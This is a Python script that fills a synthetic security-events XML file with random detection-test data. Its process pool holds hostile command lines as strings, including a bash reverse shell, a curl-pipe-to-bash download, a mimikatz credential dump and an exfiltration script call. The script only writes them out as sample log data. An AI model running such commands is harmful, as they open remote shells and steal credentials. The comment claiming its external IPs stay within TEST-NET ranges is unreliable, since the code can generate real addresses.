#!/usr/bin/env python3
"""
generate_security_events.py
───────────────────────────
Generate a synthetic security-events XML file that mirrors the schema of a
reference file but is filled with random, plausible data.

Usage
-----
    python generate_security_events.py <input_xml> <output_xml> <size_mb>

Arguments
---------
    input_xml   Path to a reference XML file (schema is read from it).
    output_xml  Destination path for the generated file.
    size_mb     Approximate target file size in megabytes (float accepted).

Example
-------
    python generate_security_events.py security_events.xml out.xml 50
"""

import sys
import random
import string
from datetime import datetime, timezone, timedelta
from xml.etree import ElementTree as ET

# ─── Random-data pools ────────────────────────────────────────────────────────

EVENT_TYPES = ["authentication", "process", "network", "file", "registry"]
ACTIONS = {
    "authentication": [
        "login_failed",
        "login_success",
        "logout",
        "password_changed",
        "mfa_challenge",
        "account_locked",
    ],
    "process": [
        "process_started",
        "process_stopped",
        "process_injected",
        "process_crashed",
        "privilege_escalated",
    ],
    "network": [
        "connection_allowed",
        "connection_blocked",
        "dns_query",
        "port_scan_detected",
        "data_exfiltration_alert",
    ],
    "file": [
        "file_created",
        "file_deleted",
        "file_modified",
        "file_renamed",
        "file_accessed",
    ],
    "registry": ["key_created", "key_deleted", "value_modified", "run_key_added"],
}
SEVERITIES = ["info", "low", "medium", "high", "critical"]
HOSTNAMES = [
    "vpn-gateway-{:02d}",
    "workstation-{:02d}",
    "firewall-{:02d}",
    "dc-server-{:02d}",
    "mail-relay-{:02d}",
    "db-host-{:02d}",
    "web-proxy-{:02d}",
    "siem-node-{:02d}",
]
USERNAMES = [
    "alice",
    "bob",
    "carol",
    "dave",
    "eve",
    "frank",
    "grace",
    "henry",
    "ivy",
    "jack",
    "karen",
    "leo",
    "mallory",
    "nina",
    "oscar",
    "peggy",
    "quinn",
    "rob",
    "sara",
    "trent",
    "uma",
    "victor",
    "wendy",
    "xander",
]
PROCESSES = [
    ("powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass"),
    ("cmd.exe", 'cmd.exe /c "whoami /all"'),
    ("python3", "python3 /tmp/exfil.py --target 10.0.0.1"),
    ("svchost.exe", "svchost.exe -k netsvcs"),
    ("wscript.exe", "wscript.exe C:\\Users\\Public\\payload.vbs"),
    ("bash", "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"),
    ("curl", "curl -s http://203.0.113.5/drop.sh | bash"),
    ("net.exe", "net user administrator /active:yes"),
    ("lsass.exe", "lsass.exe"),
    ("mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
]
PROTOCOLS = ["tcp", "udp", "icmp", "dns", "http", "https", "smb", "rdp"]
LABEL_SETS = {
    "authentication": [
        ("mfa", ["enabled", "disabled"]),
        ("service", ["vpn", "ssh", "rdp", "web"]),
        (
            "failure_reason",
            ["bad_password", "account_expired", "unknown_user", "locked"],
        ),
    ],
    "process": [
        (
            "rule",
            [
                "suspicious_powershell",
                "lolbin_abuse",
                "credential_dump",
                "lateral_movement",
            ],
        ),
        ("severity_reason", ["encoded_flags", "known_bad_hash", "unusual_parent"]),
    ],
    "network": [
        ("direction", ["inbound", "outbound"]),
        ("geo", ["US", "CN", "RU", "DE", "BR", "IR", "NL"]),
    ],
    "file": [
        ("path_type", ["system32", "temp", "startup", "appdata"]),
        ("hash_algo", ["sha256", "md5"]),
        ("verdict", ["clean", "malicious", "unknown"]),
    ],
    "registry": [
        ("hive", ["HKLM", "HKCU"]),
        ("risk", ["persistence", "credential_access", "low"]),
    ],
}

# ─── Helpers ─────────────────────────────────────────────────────────────────


def rand_ipv4(private: bool = False) -> str:
    if private:
        return (
            f"10.{random.randint(0,15)}.{random.randint(0,20)}.{random.randint(1,254)}"
        )
    # Use TEST-NET ranges (RFC 5737) for "external" IPs so no real hosts are referenced
    return f"{random.choice([203,198,192])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def rand_port(well_known: bool = False) -> int:
    if well_known:
        return random.choice([22, 80, 443, 445, 3389, 5985, 8080, 8443])
    return random.randint(49152, 65535)


def rand_hostname() -> str:
    tpl = random.choice(HOSTNAMES)
    return tpl.format(random.randint(1, 30))


def rand_username() -> tuple[str, int]:
    name = random.choice(USERNAMES)
    uid = random.randint(1000, 1099)
    return name, uid


def rand_timestamp(base: datetime, spread_seconds: int = 3600) -> str:
    """Return an ISO-8601 UTC timestamp string in the same format as the input."""
    offset = timedelta(seconds=random.randint(0, spread_seconds))
    ts = base + offset
    # Match the reference format:  2026-06-15T09:58:10Z
    return ts.strftime("%Y-%m-%dT%H:%M:%SZ")


def xml_escape(text: str) -> str:
    """Escape XML special characters in text content."""
    return (
        text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )


def rand_labels(event_type: str) -> list[tuple[str, str]]:
    pool = LABEL_SETS.get(event_type, [])
    chosen = random.sample(pool, k=min(len(pool), random.randint(1, 2)))
    return [(k, random.choice(v)) for k, v in chosen]


def rand_event_id(n: int) -> str:
    return f"evt-{n:06d}"


# ─── XML element builders ─────────────────────────────────────────────────────


def build_host(indent: str = "    ") -> str:
    name = rand_hostname()
    ip = rand_ipv4(private=True)
    return (
        f"{indent}<host>\n"
        f"{indent}  <name>{name}</name>\n"
        f"{indent}  <ip>{ip}</ip>\n"
        f"{indent}</host>\n"
    )


def build_user(indent: str = "    ") -> str:
    name, uid = rand_username()
    return (
        f"{indent}<user>\n"
        f"{indent}  <name>{name}</name>\n"
        f"{indent}  <id>{uid}</id>\n"
        f"{indent}</user>\n"
    )


def build_source(indent: str = "    ", private: bool = False) -> str:
    return (
        f"{indent}<source>\n"
        f"{indent}  <ip>{rand_ipv4(private)}</ip>\n"
        f"{indent}  <port>{rand_port()}</port>\n"
        f"{indent}</source>\n"
    )


def build_destination(indent: str = "    ", private: bool = True) -> str:
    return (
        f"{indent}<destination>\n"
        f"{indent}  <ip>{rand_ipv4(private)}</ip>\n"
        f"{indent}  <port>{rand_port(well_known=True)}</port>\n"
        f"{indent}</destination>\n"
    )


def build_process(indent: str = "    ") -> str:
    name, cmd = random.choice(PROCESSES)
    pid = random.randint(100, 65535)
    return (
        f"{indent}<process>\n"
        f"{indent}  <name>{name}</name>\n"
        f"{indent}  <pid>{pid}</pid>\n"
        f"{indent}  <command_line>{xml_escape(cmd)}</command_line>\n"
        f"{indent}</process>\n"
    )


def build_network(indent: str = "    ") -> str:
    proto = random.choice(PROTOCOLS)
    bytes_ = random.randint(64, 10_000_000)
    return (
        f"{indent}<network>\n"
        f"{indent}  <protocol>{proto}</protocol>\n"
        f"{indent}  <transport>{proto if proto not in ('http','https','dns') else 'tcp'}</transport>\n"
        f"{indent}  <bytes>{bytes_}</bytes>\n"
        f"{indent}</network>\n"
    )


def build_file_elem(indent: str = "    ") -> str:
    paths = [
        r"C:\Windows\System32\evil.dll",
        r"C:\Users\Public\payload.ps1",
        r"/tmp/.hidden/run.sh",
        r"/etc/cron.d/backdoor",
        r"C:\ProgramData\update.exe",
    ]
    path = random.choice(paths)
    name = path.split("\\")[-1].split("/")[-1]
    hash_val = "".join(random.choices(string.hexdigits[:16], k=64))
    return (
        f"{indent}<file>\n"
        f"{indent}  <name>{name}</name>\n"
        f"{indent}  <path>{path}</path>\n"
        f"{indent}  <sha256>{hash_val}</sha256>\n"
        f"{indent}</file>\n"
    )


def build_registry(indent: str = "    ") -> str:
    keys = [
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\SYSTEM\CurrentControlSet\Services\malware",
    ]
    return (
        f"{indent}<registry>\n"
        f"{indent}  <key>{random.choice(keys)}</key>\n"
        f"{indent}  <value_name>{random.choice(['Update','Helper','SvcHost'])}</value_name>\n"
        f"{indent}  <value_data>{rand_ipv4()}</value_data>\n"
        f"{indent}</registry>\n"
    )


def build_labels(event_type: str, indent: str = "    ") -> str:
    labels = rand_labels(event_type)
    if not labels:
        return ""
    lines = [f"{indent}<labels>\n"]
    for k, v in labels:
        lines.append(f'{indent}  <label key="{k}">{v}</label>\n')
    lines.append(f"{indent}</labels>\n")
    return "".join(lines)


# ─── Full event block ─────────────────────────────────────────────────────────


def build_event(n: int, base_time: datetime) -> str:
    etype = random.choice(EVENT_TYPES)
    action = random.choice(ACTIONS[etype])
    severity = random.choice(SEVERITIES)
    ts = rand_timestamp(base_time)

    parts = []
    parts.append(f'  <event id="{rand_event_id(n)}" type="{etype}">\n')
    parts.append(f"    <observed>{ts}</observed>\n")
    parts.append(f"    <action>{action}</action>\n")
    parts.append(f"    <severity>{severity}</severity>\n")
    parts.append(build_host())

    # user is present for auth and process events
    if etype in ("authentication", "process", "file", "registry"):
        parts.append(build_user())

    # source / destination for auth and network
    if etype in ("authentication", "network"):
        parts.append(build_source(private=(etype == "authentication")))
        parts.append(build_destination(private=True))

    # type-specific child elements
    if etype == "process":
        parts.append(build_process())
    elif etype == "network":
        parts.append(build_network())
    elif etype == "file":
        parts.append(build_file_elem())
    elif etype == "registry":
        parts.append(build_registry())

    lbl = build_labels(etype)
    if lbl:
        parts.append(lbl)

    parts.append("  </event>\n")
    return "".join(parts)


# ─── Main ─────────────────────────────────────────────────────────────────────


def parse_namespace(xml_path: str) -> str:
    """Extract the xmlns value from the root element."""
    tree = ET.parse(xml_path)
    root = tree.getroot()
    tag = root.tag  # e.g. "{https://example.com/...}events"
    if tag.startswith("{"):
        return tag[1 : tag.index("}")]
    return ""


def generate(input_path: str, output_path: str, target_mb: float) -> None:
    namespace = parse_namespace(input_path)
    target_bytes = int(target_mb * 1024 * 1024)

    # Use the generation timestamp as the base for observed timestamps
    base_time = datetime.now(timezone.utc)
    generated = base_time.strftime("%Y-%m-%dT%H:%M:%SZ")

    header = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        f'<events xmlns="{namespace}" generated="{generated}">\n'
    )
    footer = "</events>\n"

    written = 0
    event_n = 1

    with open(output_path, "w", encoding="utf-8") as fh:
        fh.write(header)
        written += len(header.encode("utf-8"))

        footer_bytes = len(footer.encode("utf-8"))

        while written + footer_bytes < target_bytes:
            block = build_event(event_n, base_time)
            fh.write(block)
            written += len(block.encode("utf-8"))
            event_n += 1

        fh.write(footer)
        written += footer_bytes

    final_mb = written / (1024 * 1024)
    print(f"Done: {event_n - 1} events written → {output_path} ({final_mb:.2f} MB)")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(__doc__)
        sys.exit(1)

    input_xml = sys.argv[1]
    output_xml = sys.argv[2]
    try:
        size_mb = float(sys.argv[3])
    except ValueError:
        print(f"Error: size must be a number, got {sys.argv[3]!r}")
        sys.exit(1)

    if size_mb <= 0:
        print("Error: size must be greater than 0")
        sys.exit(1)

    generate(input_xml, output_xml, size_mb)
